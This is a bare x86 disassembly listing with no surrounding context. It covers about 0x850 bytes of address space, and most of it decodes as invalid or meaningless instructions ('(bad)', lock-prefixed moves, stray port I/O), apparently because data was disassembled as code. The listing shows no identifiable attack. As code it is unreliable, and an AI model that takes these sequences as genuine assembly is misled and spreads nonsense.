  425d80:	xlat   BYTE PTR ds:[ebx]
  425d81:	xor    eax,0x4d29bab2
  425d86:	xlat   BYTE PTR ds:[ebx]
  425d87:	inc    ebp
  425d88:	xchg   ah,cl
  425d8a:	add    eax,0x77804d4d
  425d8f:	test   BYTE PTR [eax+0x4609f9f0],al
  425d95:	std    
  425d96:	or     al,0xb2
  425d98:	mov    esi,0x84f0800c
  425d9d:	adc    BYTE PTR [edi+0x537c53f9],0x72
  425da4:	push   edi
  425da6:	stos   BYTE PTR es:[edi],al
  425da7:	dec    ebp
  425da8:	xlat   BYTE PTR ds:[ebx]
  425da9:	push   ebp
  425daa:	mov    dl,0xba
  425dac:	sub    DWORD PTR [ebp-0x29],ecx
  425daf:	cmp    eax,0x4d059886
  425db4:	dec    ebp
  425db5:	xor    BYTE PTR [edi-0x76],0x80
  425db9:	lock mov dl,BYTE PTR [ebx+0x11]
  425dbd:	mov    dl,0xba
  425dbf:	sub    DWORD PTR [ebx-0x4],edx
  425dc2:	mov    dl,0x86
  425dc4:	or     al,0xff
  425dc6:	mov    dl,0x80
  425dc8:	lock mov al,BYTE PTR [eax+0x51538a97]
  425dcf:	mov    dl,0xbe
  425dd1:	or     al,0x53
  425dd3:	xchg   esp,eax
  425dd4:	mov    dl,0xf8
  425dd6:	sub    edi,edi
  425dd8:	(bad)  
  425dd9:	in     al,dx
  425dda:	mov    dl,0x80
  425ddc:	lock mov al,BYTE PTR [eax+0x51538a97]
  425de3:	mov    dl,0xbe
  425de5:	or     al,0x53
  425de7:	xchg   esp,eax
  425de8:	mov    dl,0xf8
  425dea:	sub    edi,edi
  425dec:	(bad)  
  425ded:	in     al,dx
  425dee:	mov    dl,0x80
  425df0:	lock mov al,BYTE PTR [eax+0x51538a97]
  425df7:	mov    dl,0xbe
  425df9:	or     al,0x53
  425dfb:	xchg   esp,eax
  425dfc:	mov    dl,0xf8
  425dfe:	sub    edi,edi
  425e00:	(bad)  
  425e01:	in     al,dx
  425e02:	mov    dl,0x50
  425e04:	dec    edi
  425e05:	push   edx
  425e06:	dec    ebp
  425e07:	dec    ebp
  425e08:	dec    ebp
  425e09:	xor    BYTE PTR [edi+0x55],0x80
  425e0d:	lea    eax,[eax-0x687f7910]
  425e13:	xchg   BYTE PTR [ebx+0x51],dl
  425e16:	push   ebx
  425e17:	xchg   esp,eax
  425e18:	mov    dl,0xbe
  425e1a:	or     al,0xb2
  425e1c:	clc    
  425e1d:	sub    edi,edi
  425e1f:	(bad)  
  425e20:	push   eax
  425e21:	xend   
  425e24:	dec    ebp
  425e25:	dec    ebp
  425e26:	dec    ebp
  425e27:	xor    BYTE PTR [edi+0x21],0x80
  425e2b:	lea    eax,[eax-0x687f7510]
  425e31:	mov    dl,BYTE PTR [ebx+0x51]
  425e34:	mov    dl,0xbe
  425e36:	or     al,0x80
  425e38:	ins    DWORD PTR es:[edi],dx
  425e39:	or     dl,BYTE PTR [ebx-0x6c]
  425e3c:	mov    dl,0xf8
  425e3e:	sub    edi,edi
  425e40:	(bad)  
  425e41:	push   eax
  425e42:	xend   
  425e45:	dec    ebp
  425e46:	dec    ebp
  425e47:	dec    ebp
  425e48:	xor    BYTE PTR [edi+0x1d],0x80
  425e4c:	lock sbb eax,0xbab21153
  425e52:	sub    DWORD PTR [ebx-0x4],edx
  425e55:	mov    dl,0x86
  425e57:	or     al,0xff
  425e59:	mov    dl,0x80
  425e5b:	lock mov al,BYTE PTR [eax-0x6bac7569]
  425e62:	push   ebx
  425e63:	push   ecx
  425e64:	mov    dl,0xf8
  425e66:	sub    DWORD PTR [edx-0x100f342],esi
  425e6c:	adc    BYTE PTR [edi-0x75587f76],0x53
  425e73:	jle    0x425e27
  425e75:	pop    es
  425e76:	or     al,0xed
  425e78:	(bad)  
  425e79:	or     eax,0xff29b4b2
  425e7e:	xchg   esp,eax
  425e7f:	in     al,dx
  425e80:	(bad)  
  425e81:	push   eax
  425e82:	xend   
  425e85:	dec    ebp
  425e86:	dec    ebp
  425e87:	dec    ebp
  425e88:	xor    BYTE PTR [edi-0x76],0x80
  425e8c:	lock mov ch,ch
  425e8f:	add    eax,0x29bab20d
  425e94:	push   ebx
  425e95:	cld    
  425e96:	mov    dl,0x86
  425e98:	or     al,0xff
  425e9a:	mov    dl,0x80
  425e9c:	lock mov al,BYTE PTR [eax-0x3d127569]
  425ea3:	or     eax,0xf8b25153
  425ea8:	sub    DWORD PTR [edx-0x100f342],esi
  425eae:	in     al,dx
  425eaf:	mov    dl,0x80
  425eb1:	lock mov al,BYTE PTR [eax-0x3d127569]
  425eb8:	or     eax,0xf8b25153
  425ebd:	sub    DWORD PTR [edx-0x100f342],esi
  425ec3:	add    DWORD PTR [eax],ebx
  425ec5:	push   edx
  425ec6:	dec    ebp
  425ec7:	dec    ebp
  425ec8:	dec    ebp
  425ec9:	stos   BYTE PTR es:[edi],al
  425eca:	adc    BYTE PTR [edi-0x75587f76],0xec
  425ed1:	mov    dl,0x53
  425ed3:	jle    0x425ed6
  425ed5:	lock adc DWORD PTR [eax+0x41],0x4f
  425eda:	aad    0x4d
  425edc:	dec    ebp
  425edd:	dec    ebp
  425ede:	xor    BYTE PTR [edi+0x2d],0xed
  425ee2:	(bad)  
  425ee3:	or     eax,0xb20c07b2
  425ee8:	mov    ah,0x29
  425eea:	call   DWORD PTR [ecx+eax*1-0x727277f0]
  425ef1:	lea    eax,[eax-0x72c5c133]
  425ef7:	lea    ebp,[edx+0x4d814d96]
  425efd:	xchg   edi,eax
  425efe:	and    eax,0xbdd56a4f
  425f03:	xor    BYTE PTR [edi-0x79],0x80
  425f07:	lock xor cl,BYTE PTR [ecx]
  425f0a:	inc    esi
  425f0b:	std    
  425f0c:	or     al,0xb2
  425f0e:	mov    esi,0x80b6800c
  425f13:	std    
  425f14:	xor    BYTE PTR [edi-0x79],0x80
  425f18:	xchg   edi,eax
  425f19:	xor    dl,BYTE PTR [ebx+0x72]
  425f1c:	push   ebx
  425f1d:	sub    dh,BYTE PTR [edx+0x77802984]
  425f23:	and    edi,edi
  425f25:	inc    BYTE PTR [eax+0xada6371]
  425f2b:	adc    BYTE PTR [edi-0x7faa3bab],0xc
  425f32:	and    BYTE PTR [edi-0xda707f],0x10
  425f39:	and    eax,0xc87780ef
  425f3e:	xor    al,0x8b
  425f41:	or     DWORD PTR [esi-0x3],eax
  425f44:	or     al,0xb2
  425f46:	mov    esi,0xc8f0800c
  425f4b:	and    BYTE PTR [edi+0x537c538b],0xa4
  425f52:	mov    dl,0xba
  425f54:	sub    DWORD PTR [eax+0x74ff71f0],eax
  425f5a:	in     al,dx
  425f5b:	std    
  425f5c:	xor    BYTE PTR [edi+0x21],0x80
  425f60:	sbb    eax,0x500a0063
  425f65:	lock jno 0x425f4c
  425f68:	jl     0x425f2e
  425f6a:	outs   dx,DWORD PTR ds:[esi]
  425f6b:	adc    BYTE PTR [edi+0x21778055],0x80
  425f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f73:	xor    BYTE PTR [eax+0x50659fec],0x1d
  425f7a:	sbb    BYTE PTR ds:0x80eca680,0x2e
  425f81:	lea    ecx,[ebp+0x71f0508d]
  425f87:	and    BYTE PTR [esi+0x4381a780],0x11
  425f8e:	and    BYTE PTR [edi-0x7f00af11],0x8d
  425f95:	and    BYTE PTR [esi-0x7fc28214],0x77
  425f9c:	xchg   DWORD PTR [eax-0x10],edx
  425f9f:	scas   eax,DWORD PTR es:[edi]
  425fa0:	xor    al,0x32
  425fa3:	or     DWORD PTR [esi-0x3],eax
  425fa6:	or     al,0xb2
  425fa8:	mov    esi,0x87f0800c
  425fad:	and    BYTE PTR [edi+0x537c5332],0xa4
  425fb4:	mov    dl,0xba
  425fb6:	sub    edi,edi
  425fb8:	je     0x42600a
  425fba:	ja     0x426001
  425fbc:	xor    BYTE PTR [edi+0x71],0xbe
  425fc0:	lds    edi,FWORD PTR [edx]
  425fc2:	lea    ecx,[ebp-0x7f788880]
  425fc8:	lock xor cl,BYTE PTR [ecx]
  425fcb:	inc    esi
  425fcc:	std    
  425fcd:	or     al,0xb2
  425fcf:	mov    esi,0x87f0800c
  425fd4:	and    BYTE PTR [edi+0x29bab232],0x80
  425fdb:	lock adc eax,0xa4537c53
  425fe1:	in     eax,dx
  425fe2:	mov    dl,0x8b
  425fe4:	push   DWORD PTR [esi+esi*4-0x42]
  425fe8:	arpl   WORD PTR [edx-0x72f412f7],si
  425fee:	lea    ecx,[ebp+0x171a780]
  425ff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ff5:	jae    0x425fe6
  425ff7:	inc    ebx
  425ff8:	std    
  425ff9:	push   eax
  425ffa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ffb:	xor    eax,0x803df050
  426000:	lock test DWORD PTR [eax+0x46097a77],0x86b20cb2
  42600b:	or     al,0x80
  42600d:	ja     0x426006
  42600f:	and    BYTE PTR [edi+0x2984b27a],0x80
  426016:	ja     0x425fe0
  426018:	push   ebx
  426019:	sub    dl,BYTE PTR [ebx-0x5c]
  42601c:	call   DWORD PTR [ecx]
  42601e:	and    BYTE PTR [edi-0x7db9f675],0xc
  426025:	push   eax
  426026:	ja     0x42607d
  426028:	xor    BYTE PTR [edi-0x38],0x6e
  42602c:	out    0x55,eax
  42602e:	in     eax,dx
  42602f:	mov    dl,0xa6
  426031:	mov    dl,0xc4
  426033:	or     al,0x80
  426035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426036:	mov    edx,DWORD PTR [ebx-0x5c]
  426039:	xor    BYTE PTR [edi+0x55b79455],ah
  42603f:	and    BYTE PTR [edi-0x740f7f38],0x9
  426046:	inc    esi
  426047:	adc    DWORD PTR [edx+esi*4],ecx
  42604a:	test   BYTE PTR [ecx],ch
  42604c:	xor    BYTE PTR [edi-0x38],0xb2
  426050:	mov    esi,0x8bf0800c
  426055:	push   ebx
  426056:	jo     0x42600a
  426058:	test   BYTE PTR [ecx],ch
  42605a:	xor    BYTE PTR [edi+0x55],0x53
  42605e:	lods   al,BYTE PTR ds:[esi]
  42605f:	jmp    DWORD PTR [eax+0x935f080]
  426065:	pop    esp
  426066:	xor    BYTE PTR [ebx+0x74],al
  426069:	xor    esi,DWORD PTR [edx+0x50f7f080]
  42606f:	ja     0x4260c6
  426071:	xor    BYTE PTR [edi+0x7a],0x9
  426075:	inc    esi
  426076:	mov    dl,0xc
  426078:	mov    dl,0x86
  42607a:	or     al,0x80
  42607c:	ja     0x426075
  42607e:	and    BYTE PTR [edi+0x2984b27a],0x80
  426085:	ja     0x4260bc
  426087:	or     DWORD PTR [ebp+ecx*4-0x33],ebx
  42608b:	add    eax,0xa6a453a7
  426090:	adc    ebp,ecx
  426092:	mov    dl,0xa6
  426094:	xchg   esp,eax
  426095:	xchg   BYTE PTR [ebx+0x70],dl
  426098:	xchg   BYTE PTR fs:[edi+0x36092643],cl
  42609f:	mov    dl,0xc
  4260a1:	mov    dl,0x84
  4260a3:	or     al,0x57
  4260a5:	fstp   DWORD PTR [eax-0x21]
  4260a8:	adc    DWORD PTR [ebx+0x11],edx
  4260ab:	addr16 out 0x58,al
  4260ae:	fist   WORD PTR [ecx]
  4260b0:	xlat   BYTE PTR ds:[ebx]
  4260b1:	aaa    
  4260b2:	arpl   WORD PTR [ecx],dx
  4260b4:	xlat   BYTE PTR ds:[ebx]
  4260b5:	dec    esi
  4260b6:	or     BYTE PTR [eax+eax*4],0xf0
  4260ba:	jno    0x4260a8
  4260bc:	cmp    al,BYTE PTR [eax+0x65ed55f0]
  4260c2:	out    dx,eax
  4260c3:	(bad)  
  4260c4:	aad    0xe
  4260c6:	or     BYTE PTR [eax+eax*4],0xf0
  4260ca:	jno    0x4260b8
  4260cc:	cmp    al,BYTE PTR [eax+0x77eceff0]
  4260d2:	push   ebp
  4260d3:	xor    BYTE PTR [eax],0x3a
  4260d6:	out    dx,eax
  4260d7:	in     eax,dx
  4260d8:	ja     0x42610f
  4260da:	or     al,0x4d
  4260dc:	lock cmp eax,0x4d234f09
  4260e2:	dec    ebp
  4260e3:	dec    ebp
  4260e4:	les    ebp,FWORD PTR [edi]
  4260e6:	xchg   BYTE PTR fs:[edi+0x77802643],cl
  4260ed:	adc    eax,0x7c45773a
  4260f2:	ja     0x42615e
  4260f4:	rcr    BYTE PTR [eax-0x21],1
  4260f7:	adc    DWORD PTR [eax-0x59],edx
  4260fa:	jbe    0x42607c
  4260fc:	ja     0x426168
  4260fe:	xor    al,0x76
  426101:	or     DWORD PTR [esi-0x3],eax
  426104:	or     al,0xb2
  426106:	mov    esi,0x6af0800c
  42610b:	and    BYTE PTR [edi+0x29bab276],0x80
  426112:	lock and DWORD PTR [eax+0x537c5330],eax
  426119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42611a:	push   DWORD PTR [ecx+eax*1+0x75]
  42611e:	mov    dl,0xe5
  426120:	xor    al,0x45
  426123:	arpl   di,bp
  426125:	rcl    DWORD PTR [ebp-0x80],cl
  426128:	ja     0x42619b
  42612a:	in     al,dx
  42612b:	ja     0x426142
  42612d:	push   eax
  42612e:	ja     0x4261a1
  426130:	sub    BYTE PTR [ebp-0x12],0x50
  426134:	ja     0x42614b
  426136:	xor    BYTE PTR [edi-0x79],0x80
  42613a:	lock xor cl,BYTE PTR [ecx]
  42613d:	inc    esi
  42613e:	std    
  42613f:	or     al,0xb2
  426141:	mov    esi,0x87f0800c
  426146:	and    BYTE PTR [edi+0x53a45332],0x7c
  42614d:	push   DWORD PTR [edx+esi*4-0x46]
  426151:	sub    DWORD PTR [edi+0x77],ebx
  426154:	adc    eax,0xdbf4f09
  426159:	dec    ebp
  42615a:	dec    ebp
  42615b:	xor    al,0x8a
  42615e:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  426165:	or     al,0xe2
  426167:	or     eax,0xb2f7539d
  42616c:	clc    
  42616d:	sub    edi,edi
  42616f:	inc    BYTE PTR [eax-0x587f7569]
  426175:	mov    dl,BYTE PTR [ebx+0x7e]
  426178:	mov    dl,0x7
  42617a:	or     al,0x53
  42617c:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426183:	inc    BYTE PTR [eax-0x587f7569]
  426189:	mov    dl,BYTE PTR [ebx+0x7e]
  42618c:	mov    dl,0x7
  42618e:	or     al,0x53
  426190:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426197:	inc    BYTE PTR [eax-0x587f7569]
  42619d:	mov    dl,BYTE PTR [ebx+0x7e]
  4261a0:	push   ebx
  4261a1:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261a8:	call   DWORD PTR [esp+ebp*8+0x520150fe]
  4261af:	dec    ebp
  4261b0:	dec    ebp
  4261b1:	dec    ebp
  4261b2:	xor    al,0x81
  4261b5:	adc    BYTE PTR [edi-0x79587f7a],0x53
  4261bc:	jle    0x426211
  4261be:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261c5:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  4261cc:	dec    ebp
  4261cd:	dec    ebp
  4261ce:	xor    al,0x21
  4261d1:	xor    BYTE PTR [eax],0x80
  4261d4:	xchg   edi,eax
  4261d5:	mov    al,BYTE PTR [eax+0x7f808aa7]
  4261db:	or     dl,BYTE PTR [ebx+0x7e]
  4261de:	push   ebx
  4261df:	xor    BYTE PTR [edx-0x4b4df3f9],0x29
  4261e6:	call   DWORD PTR [eax+edx*2+0x4dd51841]
  4261ed:	dec    ebp
  4261ee:	dec    ebp
  4261ef:	xor    al,0x1d
  4261f2:	adc    BYTE PTR [edi-0x4d08ace3],0xf8
  4261f9:	sub    DWORD PTR [ebx+0x51],edx
  4261fc:	mov    dl,0xbe
  4261fe:	or     al,0xff
  426200:	inc    BYTE PTR [eax-0x587f7569]
  426206:	mov    dl,BYTE PTR [ebx-0x7e]
  426209:	xor    BYTE PTR [edi-0x76],0x53
  42620d:	jle    0x4261c1
  42620f:	mov    ah,0x29
  426211:	mov    dl,0x7
  426213:	or     al,0xff
  426215:	xchg   esp,eax
  426216:	and    BYTE PTR [edi-0x1203ac76],0xc6
  42621d:	or     eax,0xb20c86b2
  426222:	mov    ah,0x29
  426224:	push   DWORD PTR [esp+ebp*8-0x9]
  426228:	push   eax
  426229:	inc    ecx
  42622a:	sbb    ch,dl
  42622c:	dec    ebp
  42622d:	dec    ebp
  42622e:	dec    ebp
  42622f:	xor    al,0x8a
  426232:	adc    BYTE PTR [edi-0x4daeac76],0xbe
  426239:	or     al,0xe2
  42623b:	or     eax,0xb2f7539d
  426240:	clc    
  426241:	sub    edi,edi
  426243:	inc    BYTE PTR [eax-0x587f7569]
  426249:	mov    dl,BYTE PTR [ebx+0x7e]
  42624c:	mov    dl,0x7
  42624e:	or     al,0x53
  426250:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  426257:	inc    BYTE PTR [eax-0x587f7569]
  42625d:	mov    dl,BYTE PTR [ebx+0x7e]
  426260:	mov    dl,0x7
  426262:	or     al,0x53
  426264:	xor    BYTE PTR [edx-0x6b00d64c],0xec
  42626b:	inc    BYTE PTR [ecx]
  42626d:	xchg   edi,eax
  42626e:	adc    DWORD PTR [eax+0x16],0x1
  426272:	aad    0x4d
  426274:	dec    ebp
  426275:	dec    ebp
  426276:	add    DWORD PTR [ecx],eax
  426278:	push   edx
  426279:	dec    ebp
  42627a:	dec    ebp
  42627b:	dec    ebp
  42627c:	xchg   esi,eax
  42627d:	xor    al,0x8a
  426280:	adc    BYTE PTR [edi-0x7faeac76],0xd7
  426287:	sub    eax,0xbeb2f753
  42628c:	or     al,0xb2
  42628e:	clc    
  42628f:	sub    edi,edi
  426291:	(bad)  
  426292:	xchg   esi,eax
  426293:	add    DWORD PTR [eax+ecx*4-0x73],ecx
  426297:	lea    ecx,[ebp+0x3e4c800a]
  42629d:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4262a3:	xchg   edi,eax
  4262a4:	and    eax,0x3acd4c80
  4262a9:	lea    ecx,[ebp-0x7fde88b0]
  4262af:	ja     0x4262a0
  4262b1:	sub    bh,0xec
  4262b4:	lock and DWORD PTR [eax-0x10],edx
  4262b8:	and    DWORD PTR [eax-0x687f3710],eax
  4262be:	mov    ecx,DWORD PTR [ecx]
  4262c0:	inc    esi
  4262c1:	mov    dh,0xc
  4262c3:	mov    dl,0x7
  4262c5:	or     al,0x80
  4262c7:	xchg   edi,eax
  4262c8:	enter  0xd780,0x8b
  4262cc:	push   ebx
  4262cd:	or     esi,DWORD PTR [edx-0x687fd608]
  4262d3:	enter  0x2a53,0xff
  4262d7:	push   ecx
  4262d8:	adc    bh,0x8b
  4262db:	or     DWORD PTR [esi-0x3e],eax
  4262de:	or     al,0xb2
  4262e0:	mov    BYTE PTR [eax+eax*4],cl
  4262e3:	xlat   BYTE PTR ds:[ebx]
  4262e4:	enter  0xa780,0x8b
  4262e8:	push   ebx
  4262e9:	pushf  
  4262ea:	push   ebx
  4262eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262ec:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  4262f3:	mov    dl,0x2
  4262f5:	sub    DWORD PTR [eax+0x46098bd7],eax
  4262fb:	ret    0xb20c
  4262fe:	mov    BYTE PTR [eax+eax*4],cl
  426301:	xlat   BYTE PTR ds:[ebx]
  426302:	enter  0xa780,0x8b
  426306:	push   ebx
  426307:	pushf  
  426308:	push   ebx
  426309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42630a:	call   DWORD PTR [esp+ebp*8-0x37687f02]
  426311:	mov    dl,0x2
  426313:	sub    DWORD PTR [eax+0x46098bd7],eax
  426319:	ret    0xb20c
  42631c:	mov    BYTE PTR [eax+eax*4],cl
  42631f:	xlat   BYTE PTR ds:[ebx]
  426320:	enter  0x9c53,0x80
  426324:	out    0x8b,eax
  426326:	push   ebx
  426327:	dec    ebp
  426328:	call   FWORD PTR [esp+ebp*8+0x4d0a96fe]
  42632f:	xlat   BYTE PTR ds:[ebx]
  426330:	and    DWORD PTR [edx-0x6979d6fe],esi
  426336:	xchg   DWORD PTR [ebp+0x4d],ecx
  426339:	xor    BYTE PTR [edi-0x51],0xab
  42633d:	test   eax,0x81fb70a3
  426342:	lea    edx,[edi-0x78127880]
  426348:	inc    ebp
  426349:	xchg   ebx,eax
  42634a:	cdq    
  42634b:	fwait
  42634c:	push   ebx
  42634d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42634e:	push   ebx
  42634f:	jo     0x4263cd
  426351:	ja     0x4262d5
  426353:	fstp   DWORD PTR [eax-0x21]
  426356:	adc    DWORD PTR [esi-0x7a],ebx
  426359:	pop    DWORD PTR [ebx+0x26]
  42635c:	push   eax
  42635d:	ja     0x4262e2
  42635f:	jl     0x4263d8
  426361:	xchg   ah,ah
  426363:	pop    eax
  426364:	fist   WORD PTR [ecx]
  426366:	push   eax
  426367:	ja     0x4262f0
  426369:	jl     0x4263e2
  42636b:	xchg   esi,esi
  42636d:	mov    ds:0x777c386f,eax
  426372:	enter  0xe9f6,0x6f
  426376:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  42637a:	cli    
  42637b:	and    al,0x6f
  42637d:	cmp    BYTE PTR [edi+esi*2+0x32],bh
  426381:	hlt    
  426382:	and    al,0x6f
  426384:	cmp    BYTE PTR [edi+esi*2-0x75],bh
  426388:	mul    BYTE PTR [esi+ebp*8]
  42638b:	cmp    BYTE PTR [ecx],al
  42638d:	ja     0x42637d
  42638f:	push   eax
  426390:	ja     0x42631d
  426392:	xor    BYTE PTR [edi+0x1d],0x80
  426396:	bound  esi,QWORD PTR [esi]
  426398:	cmp    cl,BYTE PTR [ebp+0x1d77808d]
  42639e:	xor    al,0x1d
  4263a1:	or     ch,0x2e
  4263a4:	cmp    cl,BYTE PTR [ebp-0x7f8e7f73]
  4263aa:	pop    ebp
  4263ab:	in     al,dx
  4263ac:	out    0x65,al
  4263ae:	adc    BYTE PTR [edi+0x26508082],0x3a
  4263b5:	lea    ecx,[ebp-0x7f0618b0]
  4263bb:	out    0x83,eax
  4263bd:	or     DWORD PTR [esi-0x7b],eax
  4263c0:	or     al,0xb2
  4263c2:	popa   
  4263c3:	or     al,0x80
  4263c5:	out    0x82,eax
  4263c7:	and    BYTE PTR [edi-0x583d5d7d],0xc7
  4263ce:	add    al,0xd4
  4263d0:	push   ebx
  4263d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263d2:	mov    dl,0xbc
  4263d4:	sub    DWORD PTR [eax+0x6394ff5f],eax
  4263da:	pushf  
  4263db:	xlat   BYTE PTR ds:[ebx]
  4263dc:	push   edx
  4263dd:	sbb    BYTE PTR [ecx],0x50
  4263e0:	xchg   edi,eax
  4263e1:	mov    eax,DWORD PTR [eax-0x687fea69]
  4263e7:	jno    0x426369
  4263e9:	xchg   edi,eax
  4263ea:	and    DWORD PTR [ecx],eax
  4263ec:	xchg   edi,eax
  4263ed:	test   BYTE PTR [edx-0x697428b3],ch
  4263f3:	or     bl,BYTE PTR [ecx+0x11dd74d]
  4263f9:	ja     0x4263f4
  4263fb:	dec    ebp
  4263fc:	xlat   BYTE PTR ds:[ebx]
  4263fd:	out    dx,eax
  4263fe:	dec    ebp
  4263ff:	xlat   BYTE PTR ds:[ebx]
  426400:	enter  0xd74d,0x32
  426404:	dec    ebp
  426405:	xlat   BYTE PTR ds:[ebx]
  426406:	xchg   DWORD PTR [edx],ecx
  426408:	add    DWORD PTR [edi-0x76],esi
  42640b:	or     al,BYTE PTR [esi+0x4d4d4bab]
  426411:	push   eax
  426412:	ja     0x426431
  426414:	xor    BYTE PTR [edi+0x1d],0x80
  426418:	lock and eax,0x80159250
  42641e:	ja     0x426445
  426420:	jl     0x4263af
  426422:	in     al,dx
  426423:	lea    ecx,[ebp-0x7b887f73]
  426429:	xor    al,0x25
  42642c:	push   eax
  42642d:	xchg   edx,eax
  42642e:	out    dx,al
  42642f:	xor    BYTE PTR [edi+0x71],0x80
  426433:	lock and eax,0x80ef9250
  426439:	ja     0x426450
  42643b:	xor    al,0x25
  42643e:	push   eax
  42643f:	xchg   edx,eax
  426440:	and    DWORD PTR [eax+0x6d7c2577],eax
  426446:	and    eax,0x8d8d8d3a
  42644b:	les    ebx,FWORD PTR [edi]
  42644d:	xor    BYTE PTR [edi+0x1d],0x80
  426451:	lock sbb eax,0x3a2ecd80
  426457:	lea    ecx,[ebp+0x3a265080]
  42645d:	lea    ecx,[ebp+0x3a438d80]
  426463:	push   eax
  426464:	ja     0x4263f0
  426466:	xor    BYTE PTR [edi-0x76],0xab
  42646a:	test   eax,0x1dfb70a3
  42646f:	lea    edx,[edi+0x77808780]
  426475:	and    DWORD PTR [edx-0x72c5c179],esp
  42647b:	lea    edx,[ebx-0x9986467]
  426481:	and    al,0x6f
  426483:	cmp    BYTE PTR [ecx],cl
  426485:	dec    edi
  426486:	mov    esi,0x808d8da6
  42648b:	ja     0x4264fe
  42648d:	addr16 cmc 
  42648f:	and    al,0x6f
  426491:	cmp    BYTE PTR [ecx],cl
  426493:	dec    edi
  426494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426496:	lea    ecx,[ebp-0x26788884]
  42649c:	pop    eax
  42649d:	fist   WORD PTR [ecx]
  42649f:	pop    esi
  4264a0:	xchg   BYTE PTR [edi+0x77502643],cl
  4264a6:	xor    bh,BYTE PTR [edi+esi*2-0x7]
  4264aa:	in     al,0x58
  4264ac:	fist   WORD PTR [ecx]
  4264ae:	push   eax
  4264af:	ja     0x426437
  4264b1:	xor    BYTE PTR [edi-0x11],0x50
  4264b5:	ja     0x42647f
  4264b7:	xor    BYTE PTR [edi-0x38],0x80
  4264bb:	int    0x86
  4264bd:	cmp    cl,BYTE PTR [ebp-0x7f727f73]
  4264c3:	lea    edx,[eax+0x77]
  4264c6:	mov    esp,DWORD PTR [eax+0x7f]
  4264c9:	cmp    BYTE PTR [ebp+0x38975e8d],cl
  4264cf:	lea    ecx,[ebp+0x5a7750b9]
  4264d5:	in     eax,dx
  4264d6:	push   0xd
  4264d8:	mov    ecx,0x80d17750
  4264dd:	mov    dl,0xb9
  4264df:	push   eax
  4264e0:	ja     0x4264f8
  4264e2:	pop    esi
  4264e3:	int3   
  4264e4:	cmp    BYTE PTR [ebp-0x46087f73],cl
  4264ea:	push   eax
  4264eb:	xchg   edi,eax
  4264ec:	loope  0x4264ef
  4264ee:	push   edx
  4264ef:	or     al,0x1
  4264f1:	lahf   
  4264f2:	stos   BYTE PTR es:[edi],al
  4264f3:	cmp    BYTE PTR [esi-0x47],0x50
  4264f7:	xchg   edi,eax
  4264f8:	push   ds
  4264f9:	adc    BYTE PTR [ecx+edi*4-0x121668b0],0xfb
  426501:	jle    0x4264bc
  426503:	push   eax
  426504:	xchg   edi,eax
  426505:	int    0x1
  426507:	xchg   esi,eax
  426508:	push   ebp
  426509:	add    BYTE PTR [ebp-0x1518af47],0xed
  426510:	jl     0x42658c
  426512:	mov    ecx,0x10fe750
  426517:	fistp  WORD PTR [ecx-0x47]
  42651a:	push   eax
  42651b:	out    0x4c,eax
  42651d:	mov    ecx,0xb9107750
  426522:	push   eax
  426523:	xlat   BYTE PTR ds:[ebx]
  426524:	pop    DWORD PTR [eax+0x7750b974]
  42652a:	inc    ecx
  42652b:	mov    ecx,0x4d6d1850
  426530:	dec    ebp
  426531:	dec    ebp
  426532:	in     eax,dx
  426533:	push   0x62
  426535:	mov    ecx,0x4dd84f50
  42653a:	dec    ebp
  42653b:	dec    ebp
  42653c:	add    DWORD PTR [edx+0x4f50b985],edx
  426542:	jne    0x426591
  426544:	dec    ebp
  426545:	dec    ebp
  426546:	in     eax,dx
  426547:	push   0xffffffd4
  426549:	mov    ecx,0x4d794f50
  42654e:	dec    ebp
  42654f:	dec    ebp
  426550:	add    DWORD PTR [edx+0x4f50b971],edx
  426556:	jge    0x4265a5
  426558:	dec    ebp
  426559:	dec    ebp
  42655a:	in     eax,dx
  42655b:	push   0xffffffc0
  42655d:	mov    ecx,0x4dda4f50
  426562:	dec    ebp
  426563:	dec    ebp
  426564:	mov    ecx,0x4d310150
  426569:	dec    ebp
  42656a:	dec    ebp
  42656b:	xor    BYTE PTR [ecx+edi*4+0x50],0x4f
  426570:	mov    cl,0x4d
  426572:	dec    ebp
  426573:	dec    ebp
  426574:	xor    BYTE PTR [edi-0x79],0x80
  426578:	lock xor cl,BYTE PTR [ecx]
  42657b:	inc    esi
  42657c:	std    
  42657d:	or     al,0xb2
  42657f:	mov    esi,0x87f0800c
  426584:	adc    BYTE PTR [edi-0x385893ce],0x4
  42658b:	aam    0x53
  42658d:	jl     0x4265e2
  42658f:	jb     0x426543
  426591:	mov    edx,0xc4fbff29
  426596:	xchg   edx,eax
  426597:	add    ebp,edx
  426599:	ja     0x4265f5
  42659b:	mov    ecx,0x5c09a180
  4265a0:	sbb    DWORD PTR [ecx],ecx
  4265a2:	pop    esp
  4265a3:	jo     0x4265f8
  4265a5:	adc    DWORD PTR [edx-0x72c7163e],esp
  4265ab:	lea    esi,[esi+0x9bab207]
  4265b1:	(bad)  
  4265b2:	(bad)  
  4265b3:	adc    BYTE PTR [ecx+0x2f],al
  4265b6:	or     DWORD PTR ds:0xf0804d4d,0xfffffff9
  4265bd:	adc    BYTE PTR [edi-0x49b9f67a],0xc
  4265c4:	mov    dl,0x7
  4265c6:	or     al,0x80
  4265c8:	xchg   edi,eax
  4265c9:	stc    
  4265ca:	adc    bh,0x86
  4265cd:	push   ebx
  4265ce:	sub    dl,BYTE PTR [ebx+0xb]
  4265d1:	call   DWORD PTR [ecx-0x4e]
